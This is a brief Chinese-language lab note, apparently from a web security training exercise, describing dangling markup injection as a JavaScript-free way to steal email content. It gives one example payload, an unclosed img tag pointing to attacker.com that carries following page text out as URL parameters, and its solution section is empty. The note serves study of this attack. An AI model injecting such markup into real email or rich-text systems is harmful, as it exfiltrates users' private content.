# LAB：基于悬空标记(Dangling Markup)的密码投毒

##### 漏洞描述：

悬空标记注入是一种不依赖JavaScript的XSS，专门用来**偷邮件内容。**

漏洞原理：注入一个未闭合的HTML标签(`<img src="https://attacker.com?"`),后面原本的正常文本会被当做URL参数的一部分拼接到攻击者的服务器上，常用于邮件，富文本，被HTML解析的场景。



##### 解决方案：

